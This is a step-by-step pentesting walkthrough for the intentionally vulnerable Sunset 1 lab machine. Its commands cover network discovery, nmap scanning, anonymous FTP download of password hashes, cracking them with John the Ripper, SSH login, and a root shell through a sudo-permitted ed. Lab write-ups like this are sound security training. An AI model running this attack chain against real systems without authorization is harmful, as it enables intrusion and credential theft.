# 🌇 Sunset 1 - Pentesting Walkthrough

This walkthrough documents the basic penetration testing steps performed on the **Sunset 1** vulnerable machine.

We simulate a real-world attack by exploiting FTP, cracking password hashes, and gaining access via SSH.

---

## 🛠️ Lab Setup

- **Attacker Machine:** Kali Linux (or Parrot OS)
- **Target Machine:** Sunset 1 (downloaded and running in VirtualBox/VMware)
- **Network Mode:** Both machines are connected to the **same Host-Only / Bridged Network**.

---

## 1️⃣ Network Discovery

**Goal:** Find the target machine's IP address.

### ✅ Tool: `netdiscover`

```bash
sudo netdiscover -r 192.168.1.0/24
```

- This scans the subnet for active IP addresses.
- Look for a new device on the network (often labeled as unknown or with no hostname).

---

## 2️⃣ Port Scanning

**Goal:** Identify open ports and running services.

### ✅ Tool: `nmap`

```bash
sudo nmap -A -T4 <TARGET_IP>
```

- `-A`: Enables OS detection, version detection, script scanning.
- `-T4`: Speeds up the scan.
- Look for FTP (port 21), SSH (22), web ports (80, 443), etc.

---

## 3️⃣ FTP Enumeration & Access

**Goal:** Connect to FTP and check if anonymous login is enabled.

### ✅ Tool: `ftp`

```bash
ftp <TARGET_IP>
```

If prompted for a username, try:

```
Name: anonymous
Password: [press Enter]
```

- If access is granted, list files with `ls`.
- Look for interesting files (e.g., `hashes.txt`, `users.txt`, etc.).

Download files using:

```bash
get hashes.txt
```

---

## 4️⃣ Crack Hashes

**Goal:** Use John the Ripper to crack password hashes from downloaded files.

### ✅ Tool: `john`

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

- This attempts to crack passwords using the **rockyou.txt** wordlist.
- Once cracked, use:

```bash
john --show hashes.txt
```

To display the cracked usernames and passwords.

---

## 5️⃣ SSH Access

**Goal:** Use the cracked credentials to log into the system.

### ✅ Tool: `ssh`

```bash
ssh <username>@<TARGET_IP>
```

- Enter the cracked password when prompted.
- If successful, you now have shell access to the target machine.

---

## 6️⃣ Privilege Escalation

**Goal:** Escalate privileges from user to root.

### ✅ Step 1: Check for sudo permissions

```bash
sudo -l
```

If the output shows:

```
User sunset may run the following commands on sunset:
    (root) NOPASSWD: /usr/bin/ed
```

This means the user can execute `ed` as root without a password.

---

### ✅ Step 2: Exploit `ed` to spawn root shell

Run the following:

```bash
sudo ed
```

Inside the `ed` prompt, type:

```
!sh
```

This will spawn a root shell (`#`), giving full administrative access.

You can confirm with:

```bash
whoami
```

---

## ✅ Summary

| Step | Description | Tool |
|------|-------------|------|
| 1 | Discover target IP | `netdiscover` |
| 2 | Scan for open ports | `nmap` |
| 3 | Access FTP and download hashes | `ftp` |
| 4 | Crack password hashes | `john` |
| 5 | Log into system with SSH | `ssh` |
| 6 | Privilege escalation using `ed` | `sudo`, `ed` |

---